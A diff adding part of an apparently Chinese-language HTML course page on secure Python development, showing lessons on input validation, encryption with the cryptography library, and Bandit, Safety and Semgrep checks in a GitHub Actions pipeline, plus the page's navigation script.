+    <span class="kw">if not</span> re.match(<span class="st">r'^[a-zA-Z0-9_]{1,32}$'</span>, name):
+        <span class="kw">raise</span> ValueError(<span class="st">f"用戶名格式錯誤: {name}"</span>)
+    <span class="kw">return</span> name
+
+<span class="cm"># ─── Flask API 輸入驗證（使用 marshmallow）───</span>
+<span class="kw">from</span> flask <span class="kw">import</span> request, jsonify
+<span class="cm"># pip install marshmallow</span>
+<span class="kw">from</span> marshmallow <span class="kw">import</span> Schema, fields, validate, ValidationError
+
+<span class="kw">class</span> <span class="fn">ScanRequestSchema</span>(Schema):
+    target = fields.Str(required=<span class="kw">True</span>,
+        validate=validate.Regexp(<span class="st">r'^(\d{1,3}\.){3}\d{1,3}$'</span>, error=<span class="st">"必須是有效 IP"</span>))
+    ports  = fields.Str(load_default=<span class="st">"80,443"</span>)
+    timeout = fields.Float(load_default=<span class="nu">1.0</span>,
+        validate=validate.Range(min=<span class="nu">0.1</span>, max=<span class="nu">10.0</span>))
+
+scan_schema = <span class="fn">ScanRequestSchema</span>()
+
+@app.route(<span class="st">"/api/scan"</span>, methods=[<span class="st">"POST"</span>])
+<span class="kw">def</span> <span class="fn">api_scan</span>():
+    <span class="kw">try</span>:
+        data = scan_schema.load(request.get_json())
+    <span class="kw">except</span> ValidationError <span class="kw">as</span> err:
+        <span class="kw">return</span> jsonify({<span class="st">"errors"</span>: err.messages}), <span class="nu">400</span>
+    <span class="cm"># data 已經通過驗證，可以安全使用</span>
+    <span class="kw">return</span> jsonify({<span class="st">"status"</span>: <span class="st">"ok"</span>, <span class="st">"target"</span>: data[<span class="st">"target"</span>]})</pre>
+</div>
+</div>
+
+<div class="cb" id="l5-3">
+<h2>加密與安全通訊實作</h2>
+<p>在安全工具開發中，正確使用加密是保護數據的核心。Python 的 <code>cryptography</code> 庫（而非已棄用的 <code>PyCrypto</code>）提供了現代、安全的加密原語。</p>
+<div class="cblock"><div class="ctop"><span class="clang">cryptography 庫：對稱/非對稱加密實踐</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+<pre><span class="kw">from</span> cryptography.fernet <span class="kw">import</span> Fernet
+<span class="kw">from</span> cryptography.hazmat.primitives <span class="kw">import</span> hashes, serialization
+<span class="kw">from</span> cryptography.hazmat.primitives.asymmetric <span class="kw">import</span> rsa, padding
+<span class="kw">from</span> cryptography.hazmat.primitives.kdf.pbkdf2 <span class="kw">import</span> PBKDF2HMAC
+<span class="kw">import</span> base64, os
+
+<span class="cm"># ─── 對稱加密（Fernet = AES-128-CBC + HMAC）───</span>
+<span class="kw">def</span> <span class="fn">symmetric_demo</span>():
+    key = Fernet.generate_key()          <span class="cm"># 生成隨機密鑰，安全保存！</span>
+    f   = Fernet(key)
+    cipher = f.encrypt(<span class="st">b"敏感掃描結果"</span>)  <span class="cm"># 加密</span>
+    plain  = f.decrypt(cipher)           <span class="cm"># 解密</span>
+    <span class="fn">print</span>(<span class="st">f"解密結果: {plain.decode()}"</span>)
+
+<span class="cm"># ─── 從密碼派生密鑰（PBKDF2）───</span>
+<span class="kw">def</span> <span class="fn">key_from_password</span>(password: str, salt: bytes = <span class="kw">None</span>) -> tuple:
+    salt = salt <span class="kw">or</span> os.urandom(<span class="nu">16</span>)       <span class="cm"># 隨機 salt，需保存</span>
+    kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=<span class="nu">32</span>,
+                     salt=salt, iterations=<span class="nu">480000</span>)   <span class="cm"># NIST 推薦迭代次數</span>
+    key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
+    <span class="kw">return</span> Fernet(key), salt
+
+<span class="cm"># ─── 非對稱加密（RSA-2048）───</span>
+<span class="kw">def</span> <span class="fn">rsa_demo</span>():
+    <span class="cm"># 生成密鑰對</span>
+    private_key = rsa.generate_private_key(
+        public_exponent=<span class="nu">65537</span>, key_size=<span class="nu">2048</span>
+    )
+    public_key = private_key.public_key()
+
+    <span class="cm"># 用公鑰加密（只有持有私鑰的人才能解密）</span>
+    message = <span class="st">b"scan_token_xyz"</span>
+    encrypted = public_key.encrypt(
+        message,
+        padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()),
+                     algorithm=hashes.SHA256(), label=<span class="kw">None</span>)
+    )
+    <span class="cm"># 用私鑰解密</span>
+    decrypted = private_key.decrypt(encrypted, padding.OAEP(
+        mgf=padding.MGF1(algorithm=hashes.SHA256()),
+        algorithm=hashes.SHA256(), label=<span class="kw">None</span>))
+    <span class="fn">print</span>(<span class="st">f"解密: {decrypted}"</span>)</pre>
+</div>
+</div>
+
+<div class="cb" id="l5-4">
+<h2>靜態代碼分析與 CI/CD 整合</h2>
+<p>將安全檢查整合到開發流程（DevSecOps），讓安全問題在代碼提交階段就被發現，而不是等到上線後。Python 生態有豐富的靜態分析工具可以自動化這個過程。</p>
+<div class="cblock"><div class="ctop"><span class="clang">Bandit 靜態安全分析 + GitHub Actions CI 整合</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+<pre><span class="cm"># ─── Bandit：Python 安全靜態分析工具 ───</span>
+pip install bandit
+
+<span class="cm"># 掃描整個項目，輸出 JSON 報告</span>
+bandit -r ./src/ -f json -o bandit_report.json -ll
+<span class="cm"># -ll 只報告中等及以上風險</span>
+<span class="cm"># 示例輸出：
+# >> Issue: [B105:hardcoded_password_string] Possible hardcoded password: 'secret123'
+# >> Issue: [B602:subprocess_popen_with_shell_equals_true] subprocess call with shell=True</span>
+
+<span class="cm"># ─── Safety：依賴包 CVE 掃描 ───</span>
+pip install safety
+safety check                     <span class="cm"># 檢查當前環境已安裝包的已知 CVE</span>
+safety check -r requirements.txt  <span class="cm"># 檢查 requirements 文件</span>
+
+<span class="cm"># ─── GitHub Actions 安全 CI Pipeline ───</span>
+<span class="cm"># .github/workflows/security.yml</span>
+name: Security Check
+on: [push, pull_request]
+jobs:
+  security:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Set up Python
+        uses: actions/setup-python@v4
+        with: {python-version: '3.11'}
+      - name: Install deps
+        run: pip install bandit safety
+      - name: Bandit SAST
+        run: bandit -r . -ll -x tests/  <span class="cm"># 忽略測試目錄</span>
+      - name: Safety CVE Check
+        run: safety check -r requirements.txt
+      - name: Semgrep SAST
+        uses: returntocorp/semgrep-action@v1
+        with:
+          config: >-
+            p/python
+            p/owasp-top-ten</pre>
+</div>
+<div class="done-banner">
+  <h3>Python 安全開發基礎 — 完成！</h3>
+  <p>你已系統掌握 Python 在安全工程中的完整應用：從語言基礎、數據結構、網路編程、多執行緒，到 Web 爬蟲、安全工具開發（端口掃描/密碼工具/日誌分析/PoC 框架），以及安全編碼規範、加密實踐和 DevSecOps 整合。這是貫穿所有安全方向的通用技能。</p>
+  <div class="btn-row">
+    <a href="index.html" class="btn-p">返回課程首頁</a>
+    <a href="stage14.html" class="btn-g">回顧第十四階段</a>
+  </div>
+</div>
+</div>
+</div><!-- /cw -->
+<div class="lnav">
+  <button class="lb" id="prevb" onclick="prevL()" disabled>&#8592; 上一課</button>
+  <div class="ln-mid">
+    <div class="ln-cnt" id="cnt">1 / 20</div>
+    <div class="ln-sub" id="lsub">Python 環境與語法快速入門</div>
+  </div>
+  <button class="lb pri" id="nextb" onclick="nextL()">下一課 &#8594;</button>
+</div>
+</main>
+</div>
+<script>
+const LS=[
+  {id:'l1-1',ch:'CH1',title:'Python 環境與語法快速入門',time:'25分鐘',type:'Python 基礎'},
+  {id:'l1-2',ch:'CH1',title:'數據結構：列表/字典/集合/元組',time:'20分鐘',type:'數據結構'},
+  {id:'l1-3',ch:'CH1',title:'函數、模組與異常處理',time:'20分鐘',type:'模組設計'},
+  {id:'l1-4',ch:'CH1',title:'正規表達式與文字處理',time:'20分鐘',type:'文字分析'},
+  {id:'l2-1',ch:'CH2',title:'Socket 網路編程基礎',time:'25分鐘',type:'網路編程'},
+  {id:'l2-2',ch:'CH2',title:'多執行緒與非同步 IO',time:'20分鐘',type:'並發編程'},
+  {id:'l2-3',ch:'CH2',title:'系統與進程操作（os/subprocess）',time:'20分鐘',type:'系統操作'},
+  {id:'l2-4',ch:'CH2',title:'資料庫操作：SQLite / MySQL',time:'20分鐘',type:'資料庫'},
+  {id:'l3-1',ch:'CH3',title:'HTTP 協議與 requests 庫實戰',time:'25分鐘',type:'Web 測試'},
+  {id:'l3-2',ch:'CH3',title:'BeautifulSoup / lxml 爬蟲解析',time:'20分鐘',type:'爬蟲技術'},
+  {id:'l3-3',ch:'CH3',title:'Flask Web 框架入門',time:'20分鐘',type:'Web 框架'},
+  {id:'l3-4',ch:'CH3',title:'Selenium 動態頁面爬取',time:'20分鐘',type:'自動化測試'},
+  {id:'l4-1',ch:'CH4',title:'端口掃描器開發',time:'25分鐘',type:'工具開發'},
+  {id:'l4-2',ch:'CH4',title:'密碼與哈希工具開發',time:'20分鐘',type:'密碼安全'},
+  {id:'l4-3',ch:'CH4',title:'日誌分析自動化腳本',time:'25分鐘',type:'日誌分析'},
+  {id:'l4-4',ch:'CH4',title:'漏洞 PoC 開發與利用框架',time:'25分鐘',type:'漏洞研究'},
+  {id:'l5-1',ch:'CH5',title:'Python 安全編碼規範',time:'20分鐘',type:'安全編碼'},
+  {id:'l5-2',ch:'CH5',title:'輸入驗證與 SQL 注入防護',time:'20分鐘',type:'防注入'},
+  {id:'l5-3',ch:'CH5',title:'加密與安全通訊實作',time:'20分鐘',type:'加密技術'},
+  {id:'l5-4',ch:'CH5',title:'靜態代碼分析與 CI/CD 整合',time:'20分鐘',type:'DevSecOps'},
+];
+const done=new Set(JSON.parse(localStorage.getItem('s15_done')||'[]'));
+let cur=0;
+function go(id,btn){
+  document.querySelectorAll('.cb').forEach(b=>b.classList.remove('on'));
+  document.querySelectorAll('.ls-btn').forEach(b=>b.classList.remove('lact'));
+  const bl=document.getElementById(id);if(bl)bl.classList.add('on');
+  if(btn)btn.classList.add('lact');
+  cur=LS.findIndex(l=>l.id===id);syncUI();
+  window.scrollTo({top:0,behavior:'smooth'});
+}
+function toggleCh(btn,id){
+  btn.classList.toggle('copen');
+  const l=document.getElementById(id);if(l)l.classList.toggle('lopen');
+}
+function prevL(){if(cur>0)findAndGo(LS[cur-1].id);}
+function nextL(){
+  done.add(LS[cur].id);
+  localStorage.setItem('s15_done',JSON.stringify([...done]));
+  if(cur<LS.length-1)findAndGo(LS[cur+1].id);
+}
+function findAndGo(id){
+  let btn=null;
+  document.querySelectorAll('.ls-btn').forEach(b=>{
+    if((b.getAttribute('onclick')||'').includes("'"+id+"'")){
+      btn=b;
+      const p=b.parentElement;
+      if(p&&!p.classList.contains('lopen')){
+        p.classList.add('lopen');
+        const cb=p.previousElementSibling;
+        if(cb)cb.classList.add('copen');
+      }
+    }
+  });
+  go(id,btn);
+}
+function syncUI(){
+  const l=LS[cur];if(!l)return;
+  document.getElementById('crumb').innerHTML=`STAGE 15 &gt; ${l.ch} &gt; <em>${l.title}</em>`;
+  document.getElementById('ltitle').textContent=l.title;
+  document.getElementById('chip1').textContent=l.type;
+  document.getElementById('chip2').textContent=`預計 ${l.time}`;
+  document.getElementById('cnt').textContent=`${cur+1} / ${LS.length}`;
+  document.getElementById('lsub').textContent=l.title;
+  document.getElementById('prevb').disabled=cur===0;
+  document.getElementById('nextb').disabled=cur===LS.length-1;
+  if(cur===LS.length-1)document.getElementById('nextb').textContent='課程完成';
+  else document.getElementById('nextb').innerHTML='下一課 &#8594;';
+  const pct=done.size?Math.round(done.size/LS.length*100):0;
+  document.getElementById('pct').textContent=pct+'%';
+  document.getElementById('pf').style.width=pct+'%';
+  document.querySelectorAll('.ls-btn').forEach(b=>{
+    const m=(b.getAttribute('onclick')||'').match(/'(l\d+-\d+)'/);
+    if(m&&done.has(m[1])&&!b.classList.contains('lact'))b.classList.add('ldone');
+  });
+}
+function chkQ(el,correct){
+  const box=el.closest('.quiz');
+  if(box.dataset.answered)return;
+  box.dataset.answered='1';
+  box.querySelectorAll('.qo').forEach(o=>o.style.pointerEvents='none');
+  el.classList.add(correct?'ok':'bad');
+  if(!correct)box.querySelectorAll('.qo').forEach(o=>{
+    if((o.getAttribute('onclick')||'').includes('true'))o.classList.add('ok');
+  });
+  const exp=box.querySelector('.q-exp');
+  if(exp)exp.classList.add('on');
+}
+function cpCode(btn){
+  const pre=btn.closest('.cblock').querySelector('pre');
+  navigator.clipboard.writeText(pre.innerText).then(()=>{
+    btn.textContent='已複製';setTimeout(()=>btn.textContent='複製',2000);
+  });
+}
+syncUI();
+</script>
+</body>
+</html>
